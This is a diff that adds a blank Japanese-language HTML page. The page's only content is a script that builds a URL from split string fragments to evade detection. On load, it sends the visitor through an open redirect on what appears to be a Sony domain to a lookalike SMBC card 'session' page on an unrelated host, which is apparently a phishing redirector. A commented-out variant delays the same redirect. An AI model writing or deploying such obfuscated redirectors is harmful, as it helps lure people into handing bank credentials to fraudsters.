@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="ja-JP">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script type="text/javascript">
+        function generateObfuscatedUrl() {
+            var baseUrlParams = [
+                'htt',
+                'ps:',
+                '//',
+                'ph',
+                'yd.',
+                'sony',
+                'son',
+                'po.',
+                'jp/',
+                'device',
+                'check/',
+                'redi',
+                'rect/?',
+                'red',
+                'irect',
+                'URL',
+                '='
+            ];
+
+            var hrefParams = [
+                'htt',
+                'ps:',
+                '//',
+                'smbc-',
+                'crads',
+                '-com.',
+                'schoolbullying',
+                'australia',
+                '.com',
+                '/session'
+            ];
+
+            var baseUrl = baseUrlParams.join('');
+            var hrefUrl = hrefParams.join('');
+            var obfuscatedUrl = baseUrl + hrefUrl;
+            return obfuscatedUrl;
+        }
+
+        window.onload = function () {
+            var obfuscatedUrl = generateObfuscatedUrl();
+            window.location.href = obfuscatedUrl;
+        }
+        // window.onload = function () {
+        //     var obfuscatedUrl = generateObfuscatedUrl();
+        //     var linkElement = document.createElement("a");
+        //     linkElement.href = obfuscatedUrl;
+        //     linkElement.textContent = "Complete URL";
+        //     document.body.appendChild(linkElement);
+        //     setTimeout(function() {
+        //         window.location.href = obfuscatedUrl;
+        //     }, 10000); // 10 秒后跳转
+        // }
+
+    </script>
+</head>
+
+<body>
+</body>
+
+</html>
